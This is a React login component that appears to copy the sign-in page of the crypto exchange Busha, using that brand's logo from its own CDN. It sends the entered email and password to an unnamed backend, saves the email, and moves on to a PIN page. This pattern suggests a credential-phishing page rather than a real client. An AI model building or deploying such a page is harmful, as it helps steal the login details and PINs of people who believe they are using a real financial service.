import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import axios from "axios";
import BASE_URL from "../components/urls";
import FormErrMsg from "../components/FormErrMsg";

const schema = yup.object().shape({
  email: yup.string().email("Invalid email").required("Email is required"),
  password: yup.string().required("Password is required"),
});

const Login = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const togglePassword = () => {
    setShowPassword(!showPassword);
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then((response) => {
        console.log(response.data);
        // ✅ Store email in localStorage
        localStorage.setItem("email", data.email);

        navigate("/pin");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="min-h-screen bg-white flex items-start justify-center pt-20 px-2">
      <div className="w-full max-w-md bg-white text-white p-6 rounded-lg">
        <div className="">
          <img
            src="https://cdn.prod.website-files.com/61802c0e0fc3d12b496441b6/618036efb0d9db920b3a22b6_busha-logo.svg"
            alt="logo busha"
          />
        </div>
        <h2 className="text-2xl font-bold mb-6">Log in</h2>
        <form onSubmit={handleSubmit(submitForm)} className="space-y-4">
          <div>
            <label className="block text-gray-800 mb-1">Email address</label>
            <input
              type="email"
              placeholder="Email address"
              {...register("email")}
              className="w-full p-3 rounded-md bg-gray-100 text-black placeholder-gray-400 border border-gray-700 focus:outline-none"
            />
            <FormErrMsg errors={errors} inputName="email" />
          </div>

          <div>
            <label className="block text-gray-800 mb-1">Password</label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                {...register("password")}
                className="w-full p-3 rounded-md bg-gray-100 text-black placeholder-gray-400 border border-gray-700 focus:outline-none"
              />
              <span
                onClick={togglePassword}
                className="absolute right-3 top-3 text-gray-400 cursor-pointer"
              >
                {showPassword ? <AiOutlineEyeInvisible /> : <AiOutlineEye />}
              </span>
            </div>
            <FormErrMsg errors={errors} inputName="password" />
          </div>

          <div className="text-left">
            <a
              href="/forgot-password"
              className="text-green-500 hover:underline text-sm"
            >
              Forgot password?
            </a>
          </div>

          <button
            type="submit"
            disabled={loading}
            className={`w-full py-3 rounded-md text-white font-semibold transition-colors ${
              loading
                ? "bg-green-900 cursor-not-allowed"
                : "bg-green-700 hover:bg-green-800"
            }`}
          >
            {loading ? "Logging in..." : "Log in"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Login;
